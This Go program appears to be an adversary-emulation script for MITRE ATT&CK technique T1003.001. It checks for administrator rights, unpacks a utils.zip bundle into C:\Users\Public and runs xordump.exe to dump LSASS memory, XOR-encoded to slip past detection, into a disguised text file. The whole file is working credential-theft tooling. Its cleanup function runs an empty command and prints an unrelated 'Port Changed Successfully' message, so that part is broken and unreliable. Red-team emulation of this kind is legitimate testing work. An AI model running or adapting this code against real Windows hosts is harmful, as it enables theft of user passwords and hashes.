// T1003.001 - OS Credential Dumping: LSASS Memory
package main

import (
	"fmt"
	"os/exec"
)

const outputDirectory = "C:\\Users\\Public"

func main() {
	if !isAdmin() {
		fmt.Println("[-] Not running as admin, exiting...")
		pressEnterToContinue()
		return
	}
	cmd := fmt.Sprintf("Expand-Archive -Path .\\utils.zip -DestinationPath %s -Force", outputDirectory)

	res, output := execute_command(cmd, true)
	if !res {
		fmt.Println("[-] Error: ", output)
		pressEnterToContinue()
		return
	} else {
		fmt.Println("[+] Utils Extracted Successfully")
	}
	cmd = fmt.Sprintf("%s\\xordump.exe -out %s\\change_to_bin.txt -x 0x41", outputDirectory, outputDirectory)
	res, output = execute_command(cmd, false)
	if !res {
		fmt.Println("[-] Error: ", output)
	} else {
		fmt.Println("[+] Dumped Successfully")
	}
	pressEnterToContinue()
}

func isAdmin() bool {
	cmd := exec.Command("net", "session")
	err := cmd.Run()
	if err != nil {
		return false
	} else {
		return true
	}
}

func execute_command(cmd string, isPowershell bool) (bool, string) {
	cmd_shell := "powershell"
	if !isPowershell {
		cmd_shell = "cmd"
	}
	// Run Command and Capture Output as well as Error
	out, err := exec.Command(cmd_shell, "/C", cmd).CombinedOutput()
	cmd_out := string(out)
	return err == nil, string(cmd_out)
}

func cleanup() {
	cmd := fmt.Sprintf("")
	res, output := execute_command(cmd, true)
	if res {
		fmt.Println("Port Changed Successfully")
	} else {
		fmt.Println("Error: ", output)
	}
}

func pressEnterToContinue() {
	fmt.Println("Press ENTER to continue...")
	fmt.Scanln()
}
